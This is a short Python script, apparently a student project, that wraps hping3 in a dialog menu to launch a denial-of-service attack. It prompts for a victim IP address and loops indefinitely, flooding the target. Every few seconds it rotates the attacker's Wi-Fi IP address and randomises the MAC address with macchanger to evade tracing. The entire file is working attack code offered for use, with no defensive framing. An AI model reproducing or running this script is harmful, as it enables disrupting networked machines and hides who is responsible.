#! /usr/bin/python

import os
import time
import signal
import commands


def a():



	def my(x,y):
		os.system("pkill hping3 > /dev/null")
		os.system("ifconfig wlan0 up")
		b()
	


	signal.signal(2,my)


	os.system("dialog --infobox '   Welcome to the DOS attack' 10 40")
	time.sleep(2)
	def b():
		os.system("dialog --menu 'Select the desired option : ' 20 100 7 1 'DOS attack on any machine.' 2 'Back' 2>  /root/Desktop/Project/choice.txt")
		f=open('/root/Desktop/Project/choice.txt','r')
		c=f.read()
		if c=='1':
			os.system("ifconfig | grep Bcast | awk '{print $2}' | cut -c 6-18 > /root/Desktop/Project/ip.txt")
			os.system("dialog --inputbox 'Enter victim(s) IP Address :' 10 40 2> /root/Desktop/Project/hello.txt")
			f=open('/root/Desktop/Project/hello.txt','r')
			x=f.read()
			f=open('/root/Desktop/Project/ip.txt','r')
			v=f.read()
			os.system("dialog --infobox 'DOS attack started. \nPress CTRL+C to stop.' 10 40")
			while True :
				i=2
				while i<252:
					p=str(i)
					os.system("ifconfig wlan0 192.168.1."+p)
					os.system("ifconfig wlan0 down")
					os.system("macchanger -r wlan0 > /dev/null")
					os.system("ifconfig wlan0 up")
					commands.getoutput("hping3 -i wlan0 --flood "+x+" > /dev/null")
					time.sleep(5)
					os.system("pkill hping3")
					i=i+1

		if c==2:
			exit()



	b()
